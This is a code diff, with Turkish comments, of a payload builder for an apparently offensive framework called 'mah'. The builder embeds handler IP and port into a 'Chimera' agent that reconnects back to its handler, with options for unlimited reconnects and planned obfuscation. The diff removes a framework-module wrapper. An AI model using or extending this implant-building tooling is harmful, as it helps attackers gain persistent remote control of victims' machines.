@@ -5,15 +5,15 @@ Chimera Builder - Payload Oluşturma Aracı
 Chimera agent kaynak kodunu okur, kullanıcının belirlediği konfigürasyon
 değerlerini (IP, Port vb.) gömer ve çalıştırmaya hazır bir payload dosyası üretir.
 
-Kullanım Modları:
     1. Standalone CLI:
         python3 build/chimera_builder.py --lhost 10.0.0.1 --lport 4444 -o /tmp/agent.py
 
-    2. Framework Entegrasyonu:
-        mah > use build/chimera_builder
-        mah (chimera_builder) > set LHOST 10.0.0.1
-        mah (chimera_builder) > set LPORT 4444
-        mah (chimera_builder) > run
+    2. Framework Modülü (Tavsiye Edilen):
+        mah > use payloads/python/chimera/generate
+        mah (generate) > set LHOST 10.0.0.1
+        mah (generate) > set LPORT 4444
+        mah (generate) > set STRIP_COMMENTS true
+        mah (generate) > run
 
 Planlanan Özellikler:
     - Obfuscation (AST manipülasyonu, string şifreleme, junk code)
@@ -29,16 +29,6 @@ import ipaddress
 import argparse
 from datetime import datetime
 
-# Framework entegrasyonu için opsiyonel import
-# Standalone modda bu import'lar kullanılmaz
-_FRAMEWORK_AVAILABLE = False
-try:
-    from core.module import BaseModule
-    from core.option import Option
-    from typing import Dict, Any
-    _FRAMEWORK_AVAILABLE = True
-except ImportError:
-    pass
 
 
 # ============================================================
@@ -412,83 +402,6 @@ def print_build_report(result: dict):
     print(f"  ║  └─ python3 <payload_dosyası>                           ║")
     print(f"  ╚{border}╝\n")
 
-
-# ============================================================
-# Framework Entegrasyonu (BaseModule)
-# ============================================================
-if _FRAMEWORK_AVAILABLE:
-    class Builder(BaseModule):
-        """
-        Chimera Builder - Payload Oluşturma Modülü.
-
-        Agent koduna LHOST/LPORT değerlerini gömer ve çalıştırmaya hazır
-        bir payload dosyası üretir. Gelecekteki obfuscation ve exe dönüşümü
-        için temel altyapıyı sağlar.
-        """
-        Name = "Chimera Builder"
-        Description = "Chimera agent payload oluşturucu. IP/Port gömme, doğrulama ve build raporu."
-        Author = "Mahmut P."
-        Category = "build"
-
-        def __init__(self):
-            super().__init__()
-            self.Options = {
-                "LHOST": Option(
-                    "LHOST", "127.0.0.1", True,
-                    "Hedef handler IP adresi veya hostname."
-                ),
-                "LPORT": Option(
-                    "LPORT", 4444, True,
-                    "Hedef handler port numarası."
-                ),
-                "OUTPUT": Option(
-                    "OUTPUT", "", True,
-                    "Oluşturulan payload'ın kaydedileceği dosya yolu.",
-                    completion_dir="."
-                ),
-                "RECONNECT_DELAY": Option(
-                    "RECONNECT_DELAY", 5, False,
-                    "Agent yeniden bağlanma bekleme süresi (saniye)."
-                ),
-                "MAX_RECONNECT": Option(
-                    "MAX_RECONNECT", -1, False,
-                    "Maksimum yeniden bağlanma denemesi (-1 = sınırsız)."
-                ),
-                "STRIP_COMMENTS": Option(
-                    "STRIP_COMMENTS", False, False,
-                    "Yorum satırlarını kaldır (boyut küçültme).",
-                    choices=[True, False]
-                ),
-            }
-
-        def run(self, options: Dict[str, Any]):
-            """Builder'ı çalıştırır ve payload oluşturur."""
-            lhost = self.get_option_value("LHOST")
-            lport = self.get_option_value("LPORT")
-            output = self.get_option_value("OUTPUT")
-            reconnect_delay = int(self.get_option_value("RECONNECT_DELAY"))
-            max_reconnect = int(self.get_option_value("MAX_RECONNECT"))
-            strip_comments = self.get_option_value("STRIP_COMMENTS")
-
-            # Boolean dönüşümü
-            if isinstance(strip_comments, str):
-                strip_comments = strip_comments.lower() in ("true", "1", "yes", "evet")
-
-            result = build_payload(
-                lhost=lhost,
-                lport=int(lport),
-                reconnect_delay=reconnect_delay,
-                max_reconnect=max_reconnect,
-                output_path=output if output else None,
-                strip_comments=bool(strip_comments),
-            )
-
-            print_build_report(result)
-
-            if result["success"]:
-                return result["output_path"] or result["code"]
-            else:
-                return result["error"]
 
 
 # ============================================================
